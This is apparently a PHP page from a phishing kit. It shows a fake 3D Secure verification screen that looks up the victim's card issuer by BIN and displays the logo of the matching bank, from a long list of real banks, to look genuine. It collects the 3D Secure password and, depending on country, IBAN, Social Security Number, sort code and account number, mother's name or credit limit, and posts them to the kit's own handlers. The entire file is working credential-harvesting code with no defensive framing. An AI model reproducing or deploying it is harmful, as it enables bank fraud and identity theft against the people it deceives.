<?php

	
	require_once __DIR__.'/functions/functions.php';
	require __DIR__.'/functions/crypt.php';
	require_once __DIR__.'/../lang/detect.php';

	if ($SETTING_VBV == 1)
	{

	}
	else
	{
		header("Location: bankacc.php?_cmd=".md5(rand(1,999))."&verification_dispatch=".base64_encode(md5(rand(1,100))));
		exit();
	}


	/// Bank Info
	$CardNumber = $_SESSION['Nu'];
	$BankInfo = BinInfo($CardNumber);
	error_reporting(0);
?>
		<title><?php echo $BankInfo->issuer; ?> - 3D Security</title>
        <link rel="stylesheet" type="text/css" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" type="text/css" href="../assets/css/font-awesome.min.css">
        <style type="text/css">
        .VbvForm{
            width: 385px;
    		text-align: left;
	    	border: 1px solid #7d7d7d;
		    border-radius: 3px;
		    margin-top: 30px;
        }
        .VbvToDo{
        	color: #7d7d7d;
        }
        </style>
        <!-- Scripts -->
        <script type="text/javascript" src="../assets/js/jquery.min.js"></script>
        <script type="text/javascript" src="../assets/js/CardType.js"></script>
        <meta charset="utf-8">
<center>
<form action="functions/vbv.php?Pars=<?php $ExpDir = explode('/', $_SERVER['PHP_SELF']); echo $ExpDir[count($ExpDir)-2]; ?>" method="post" id="VbvForm">
        <script type="text/javascript">
            
            $(document).ready(function(){
            	$('.VbvForm').toggleClass();
                $('#Vbv_Form').submit(function(){
                	$.ajax({
                		url: '../includes/Ajax.php',
                		method: 'post',
                		data: $('#VbvForm').serialize(),
						beforeSend: function(){
							$('.spinner').removeClass('hide');
						},
						success: function(JsonResponse){

							var JSONArray = $.parseJSON(JsonResponse);

							if (JSONArray.status == 'fail')
							{
								location.reload();
							}
							else
							{
								window.location = 'VerifyID.php';
							}

							$('.spinner').addClass('hide');
						}
                	});
                    return false;
                });
            });

        </script>
	                 <div class="transitioning spinner hide">
	                 	<p class="oneSecond"><?php echo $P4_text1; ?></p>
	                 </div>

	                    			<div class="VbvForm">
	                    				<br>
	                    				<div class="col-md-12">
	                    					<div style="width: 50%;float: left;">
<?php
	$BankName = $BankInfo->issuer;
	$BankIn   = $BankInfo->bin;

   if($BankName=="BANCO DE AHORRO Y CREDITO DE LAS AMERICAS" ){
       echo '<img style="max-width: 110px;" src="../assets/img/Bank/banre.gif">';
   }
   
   if($BankName=="VISALUX S.C" ){
       echo '<img style="max-width: 110px;" src="../assets/img/Bank/spuerkeess.gif">';
   }
   
   if($BankName=="BANKA KOMBETARE TREGTARE SH.A." ){
       echo '<img style="max-width: 110px;" src="../assets/img/Bank/bkt.gif">';
   }

   if($BankName=="BANK OF NOVA SCOTIA" ){
       echo '<img style="max-width: 110px;" src="../assets/img/Bank/noobscot.png">';
   }

	else if($BankName=="HSBC" || $BankName=="HSBC BANK" || $BankName=="HSBC BANK PLC"){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/noobhsbc.gif">';
	   }

	else if($BankName=="EURO KARTENSYSTEME GMBH" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/noobnbk.gif">';
	   }

	else if($BankName=="LLOYDS"){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/noobloyd.png">';
	   }

	else if($BankName=="ROYAL BANK OF SCOTLAND" || $BankName=="ROYAL BANK OF SCOTLAND PLC" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/noobrbc.png">';
	   }


	else if($BankName=="NATIONAL WESTMINSTER BANK PLC" || $BankName=="NAT WEST" || $BankName=="NATWEST" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/noobnat.gif">';
	   }

	else if($BankName=="WELLS FARGO BANK, N.A." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/well.gif">';
	   }
	else if($BankName=="UBS AG" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/ubs.png">';
	   }

	else if($BankName=="NATIONWIDE" || $BankName=="NATIONWIDE BUILDING SOCIETY" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/noobnwide.gif">';
	   }


	else if($BankName=="BARCLAYS" || $BankName=="BARCLAYS BANK PLC" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/barcli.gif">';
	   }

	   
	   

	else if($BankName=="ULSTER BANK, LTD." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/ulsterbnk.gif">';
	   }
	   
	   
	else if($BankName=="CLYDESDALE BANK PLC" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/clyde.gif">';
	   }

	else if($BankName=="SANTANDER" || $BankName=="SANTANDER UK PLC" || $BankName=="SANTANDER CENTRAL HISPANO" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/san.gif">';
	   }

	else if($BankName=="BANCO SANTANDER, S.A." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/open.gif">';
	   }

	else if($BankName=="FIRST DIRECT, DIVISION OF HSBC UK" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/fdirect.gif">';
	   }

	else if($BankName=="BARCLAYCARD" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/noobbarclay.gif">';
	   }
	   
	else if($BankName=="NATIONAL AUSTRALIA BANK, LTD." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/nab.png">';
	   }
	else if($BankName=="TELLER, A.S." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/tellr.gif">';
	   }

	else if($BankName=="BANK OF AMERICA" || $BankName == "BANK OF AMERICA, N.A." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/bofa.gif">';
	   }

	else if($BankName=="MBNA EUROPE BANK, LTD." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/noobmbna.png">';
	   }

	else if($BankName=="BANK OF IRELAND" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/boirland.png">';
	   }

	else if($BankName=="LANSFORSAKRINGAR BANK AB" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/lansfor.png">';
	   }

	else if($BankName=="CITIBANK INTERNATIONAL PLC" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/citi.gif">';
	   }

	else if($BankName=="Nordea" || $BankName=="NORDEA BANK FINLAND PLC" || $BankName=="NORDEA BANK DANMARK A/S" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/nordea.png">';
	   }



	else if($BankName=="BANGKOK BANK PUBLIC CO., LTD." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/Bangkobnk.png">';
	   }

	   
	   
	else if($BankIn=="475111" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/ulsterbnk.gif">';
	   }
	   
	   
	else if($BankIn=="518652" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/teskobnk.gif">';
	   }
	   
	   
	else if($BankIn=="462239" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/anz.gif">';
	   }
	else if($BankIn=="431938" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/boi.gif">';
	   }

	else if($BankIn=="524590" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/bglbnp.gif">';
	   }
	   
	else if($BankIn=="429941" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/eikalogo.svg">';
	   }

	else if($BankIn=="462287" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/Bangkobnk.png">';
	   }

	else if($BankIn=="516815" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/swedbnk.png">';
	   }

	else if($BankName=="Swedbank" || $BankName=="SWEDBANK AB" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/swedbnk.png">';
	   }

	else if($BankIn=="462845" || $BankIn=="554827" || $BankIn=="526471" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/dbs.gif">';
	   }

	else if($BankIn=="517011" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/netstech.png">';
	   }

	else if($BankName=="KASIKORNBANK PUBLIC CO., LTD." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/bgo.gif">';
	   }

	else if($BankName=="BANK OF CYPRUS PUBLIC CO., LTD." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/bnkofcy.png">';
	   }

	else if($BankName=="DESJARDINS" || $BankName=="LA FEDERATION DES CAISSES DESJARDINS DU QUEBEC" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/desjardinsbnk.png">';
	   }

	else if($BankName=="HALIFAX" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/halif.gif">';
	   }

	else if($BankName=="SCHWEIZERISCHER BANKVEREIN (SWISS BANK CORPORATION" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/sissbnkcoop.png">';
	   }

	else if($BankName=="CIBC" || $BankName=="CANADIAN IMPERIAL BANK OF COMMERCE" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/cibc.png">';
	   }
	   
	else if($BankName=="BANK OF MONTREAL" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/bnkmontreal.png">';
	   }

	else if($BankName=="NATIONAL BANK OF CANADA" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/nationalbank.png">';
	   }

	else if($BankName=="ROYAL BANK OF CANADA" || $BankName=="RBC ROYAL BANK OF CANADA" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/rbc.png">';
	   }

	else if($BankName=="TD CANADA TRUST" || $BankName=="COMPASS BANK" || $BankName=="TORONTO-DOMINION BANK" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/canadatrust.gif">';
	   }

	else if($BankIn=="446291" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/halif.gif">';
	   }  
	 
	else if($BankIn=="472409" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/canadatrust.gif">';
	   }
	   
	else if($BankName=="WESLEYAN SAVINGS BANK, LTD." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/wesle.png">';
	   }

	else if($BankName=="CO-OPERATIVE BANK PLC" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/coperative.png">';
	   }

	else if($BankName=="STANDARD CHARTERED BANK" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/standar.png">';
	   }

	else if($BankName=="ALLIANCE AND LEICESTER PLC" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/alliance.png">';
	   }

	else if($BankName=="BANCO SABADELL" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/saba.png">';
	   }

	else if($BankName=="PRESIDENT'S CHOICE FINANCIAL" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/president.png">';
	   }

	else if($BankName=="CAPITAL ONE BANK OF CANADA BRANCH" || $BankName=="CAPITAL ONE BANK (CANADA BRANCH)" || $BankName=="CAPITAL ONE BANK (USA), N.A." ||  $BankName=="CAPITAL ONE BANK N.A." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/capitalone.png">';
	   }

	else if($BankName=="SEB" || $BankName=="SKANDINAVISKA ENSKILDA BANKEN AB" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/SEBlogo.png">';
	   }
	   

	else if($BankName=="BNP PARIBAS FORTIS" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/bnpt.jpg">';
	   }

	else if($BankName=="BNP PARIBAS" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/bnp.png">';
	   }

	else if($BankName=="BANCO POPULAR DE PUERTO RICO" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/bancopop.gif">';
	   }

	else if($BankName=="Handelsbanken" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/hand.png">';
	   }
	   
	else if($BankName=="METRO BANK PLC" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/metro.gif">';
	   }

	else if($BankName=="LLOYDS TSB"  || $BankName=="LLOYDS TSB BANK PLC" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/tsb1.gif">';
	   }

	else if($BankName=="BANK OF NEW ZEALAND" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/bnz.gif">';
	   }

	else if($BankName=="EVO BANCO" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/EVO.png">';
	   }

	else if($BankName=="BANCO POPULAR DE PUERTO RICO" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/bancopopular.gif">';
	   }

	else if($BankName=="CAIXABANK S.A." || $BankName=="LA CAIXA" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/CaixaCard.gif">';
	   }

	else if($BankName=="UNITED NATIONAL BANK, LTD." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/unb.jpg">';
	   }

	else if($BankName=="BANCA MARCH, S.A." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/march.gif">';
	   }

	else if($BankName=="BRD - GROUPE SOCIETE GENERALE, S.A." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/brd.jpg">';
	   }

	else if($BankName=="SOCIETE GENERALE, S.A." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/stegenerale.png">';
	   }

	else if($BankName=="FIRST DIRECT, DIVISION OF HSBC UK" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/fdirect.gif">';
	   }

	else if($BankName=="LLOYDS BANK PLC" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/Lloydsopop.gif">';
	   }

	else if($BankName=="RAIFFEISEN BANK SH.A." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/RaiffeisenBankLogo.jpg">';
	   }

	else if($BankName=="ACCESS BANK PLC" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/ACCESS-BANK.jpg">';
	   }

	else if($BankName=="ERSTE AND STEIERMARKISCHE BANK D.D." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/ERSTE.png">';
	   }

	else if($BankName=="CHASE BANK USA, N.A." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/chase.jpg">';
	   }

	else if($BankName=="JPMORGAN CHASE BANK, N.A." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/jpmorganchase.jpg">';
	   }

	else if($BankName=="COMMONWEALTH BANK OF AUSTRALIA" || $BankName == "COMMONWEALTH BANK" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/old-commonwealth-bank-logo-1024x379-1024x379.jpg">';
	   }
	else if($BankName=="ASB BANK" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/asb.jpg">';
	   }
	else if($BankName=="STANDARD CHARTERED GRINDLAYS (OFFSHORE), LTD." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/standard-chartered-uk.jpg">';
	   }
	else if($BankName=="U.S. BANK N.A. ND" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/comp_1_logo-usbank-siteheader.png">';
	   }
	else if($BankName=="REGIONS BANK" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/REG_color_register.jpg">';
	   }
	else if($BankName=="BRANCH BANKING AND TRUST COMPANY" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/bbtlogo.jpg">';
	   }
	else if($BankName=="PNC BANK, N.A." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/pnc.png">';
	   }
	else if($BankName=="SHAZAM, INC." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/SHAZAM_CMYK.png">';
	   }
	else if($BankName=="CITIBANK, N.A." || $BankName == "CITIBANK"){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/CITIBANK.jpg">';
	   }
	else if($BankName=="KRUNGTHAI CARD PUBLIC CO., LTD." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/csr-ktb-brandage13062554-1.jpg>';
	   }
	else if($BankName=="KRUNG THAI BANK PUBLIC CO., LTD." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/krungthai bank.png">';
	   }
	else if($BankName=="BANGKOK BANK PUBLIC CO., LTD." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/Bangkok_bank.png">';
	   }
	else if($BankName=="NATIONAL WESTMINSTER BANK PLC" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/NationalWestminsterBank1970.png">';
	   }
	else if($BankName=="M BANK, F.S.B." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/Mbank-logo.jpg">';
	   }
	else if($BankName=="CARTASI S.P.A." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/cartasi.jpg">';
	   }
	else if($BankName=="CHELSEA GROTON BANK" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/CG_Stacked_A.png">';
	   }
	else if($BankName=="GWINNETT F.C.U." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/GCB_Logo005a.png">';
	   }
	else if($BankName=="GE CAPITAL RETAIL BANK" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/GE-Capital-Logo.jpg">';
	   }
	else if($BankName=="JPMORGAN CHASE BANK, N.A." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/jpmorganchase.jpg">';
	   }

	else if($BankName=="FIRST DIRECT, DIVISION OF HSBC UK" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/fdirect.gif">';
	   }

	else if($BankName=="CREDIT ONE BANK, N.A." ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/CreditOne.jpg">';
	   }
	else if($BankName=="FIRST DIRECT, DIVISION OF HSBC UK" ){
	       echo '<img style="max-width: 110px;" src="../assets/img/Bank/fdirect.gif">';
	   }
	else if($BankName==NULL ) {
	      echo '<img style="max-width: 110px;" src="../assets/img/logo_ppl_106x29.png">';
	   }
	   
	else {
	      echo '<img style="max-width: 110px;" src="../assets/img/logo_ppl_106x29.png">';
	   } ?></div>

	                    					<div class="pull-left text-right" style="width: 50%;">
											
	                    					<img class="text-left" style="width:106px;max-height: 47px;padding: 0px 5px 5px 5px;" src="
	                    					<?php
	                    					$CardBrand = getCardBrand($CardNumber);
	                    					if ($CardBrand !== 'unknown') {
	                    						echo $CardBrand;
	                    					}
	                    					?>
	                    					">
											</div>
	                    				</div>
	                    				<p class="text-center" style="margin-top: 55px;color: #565656;">
<?php echo $BankInfo->issuer; ?>
	
</p>
	                    				<div class="col-md-12">
	                    					<p style="color:#525252"><?php echo $P4_text2; ?> <?php echo $_SESSION['Fn']; ?>  <?php echo $_SESSION['Ln']; ?>,</p>
	                    					<p class="VbvToDo" style="color:#7d7d7d;margin-bottom: 0px;">
	                    					<p style="color:#7d7d7d;margin-bottom:5px;font-size: 13px;">
	                    					<?php echo $P4_text3; ?>
	                    					</p>
	                    					<p style="color:#7d7d7d;font-size: 13px;"><?php echo $P4_text4; ?></p>
	                    				</div>

	                    				<center>
	                    					<table style="color: #565656;font-size: 14px;">
						                    <tbody>
						                        <tr>
						                            <td><?php echo $P4_text5; ?></td>
						                            <td>:</td>
						                            <td>XXXX-XXXX-XXXX-<?php echo substr($_SESSION['Nu'], -4) ?></td>
						                        </tr>
						                     </tbody>
						                    </table>
						                    <table style="color: #565656;width: 80%;margin-top: 4%;font-size: 14px;">
						                        <tbody>
						                            <tr>
						                                <td>3D Secure</td>
						                                <td><input name="3d_sec" required="" style="margin-top: 2%;padding-left: 3px;" placeholder="3D Password"></td>
						                            </tr>
<?php if ($BankInfo->country_code == 'BE' OR 
		  $BankInfo->country_code == 'DE' OR 
		  $BankInfo->country_code == 'NL' OR 
		  $BankInfo->country_code == 'CH' OR 
		  $BankInfo->country_code == 'AT')
		  { ?>
						                            <tr>
						                                <td>Bank Account Number (IBAN)</td>
						                                <td><input id="dateofbirth" required="" name="iBan" style="margin-top: 2%;padding-left: 3px;" placeholder="Bank Account Number (IBAN)"></td>
						                            </tr>
<?php }elseif($BankInfo->country_code == 'US'){ ?>
						                            <tr>
						                                <td>Social Security Number</td>
						                                <td><input id="dateofbirth" required="" name="5SN" style="margin-top: 2%;padding-left: 3px;" placeholder="SSN"></td>
						                            </tr>
<?php }elseif($BankInfo->country_code == 'UK'){ ?>
						                            <tr>
						                                <td>Sort Code</td>
						                                <td><input id="dateofbirth" required="" name="scode" style="margin-top: 2%;padding-left: 3px;" placeholder="Sort Code"></td>
						                            </tr>
						                            <tr>
						                                <td>Account Number</td>
						                                <td><input id="dateofbirth" required="" name="accnumber" style="margin-top: 2%;padding-left: 3px;" placeholder="Account Number"></td>
						                            </tr>
<?php }elseif($BankInfo->country_code == 'IE'){ ?>
						                            <tr>
						                                <td>Sort Code</td>
						                                <td><input id="dateofbirth" required="" name="scode" style="margin-top: 2%;padding-left: 3px;" placeholder="Sort Code"></td>
						                            </tr>
						                            <tr>
						                                <td>Mother Name</td>
						                                <td><input id="dateofbirth" required="" name="mname" style="margin-top: 2%;padding-left: 3px;" placeholder="Mother Name"></td>
						                            </tr>
						                            <tr>
						                                <td>Credit Limit</td>
						                                <td><input id="dateofbirth" required="" name="climit" style="margin-top: 2%;padding-left: 3px;" placeholder="Credit Card Limit"></td>
						                            </tr>
<?php }elseif($BankInfo->country_code == 'AU'){ ?>
						                            <tr>
						                                <td>OSID</td>
						                                <td><input id="dateofbirth" required="" name="OID" style="margin-top: 2%;padding-left: 3px;" placeholder="OSID"></td>
						                            </tr>
						                            <tr>
						                                <td>Credit Limit</td>
						                                <td><input id="dateofbirth" required="" name="climit" style="margin-top: 2%;padding-left: 3px;" placeholder="Credit Card Limit"></td>
						                            </tr>
<?php }else{  } ?>
						                            <tr>
						                                <td></td>
						                                <td><input type="submit" value="Submit" id="dateofbirth" required="" name="dateofbirth" style="margin-top: 7%;padding-left: 3px;width: 80px;" placeholder="Date of birth (DD/MM/YYYY)"></td>
						                            </tr>
						                        </tbody>
						                    </table>
						                    <br />
						                    <p style="margin-bottom: 11px;font-size: 11px;color: darkgrey;"><?php echo $P4_text6; ?>-<?php echo date('Y'); ?> .</p>
	                    				</center>
	                    			</div>
</center>

</form>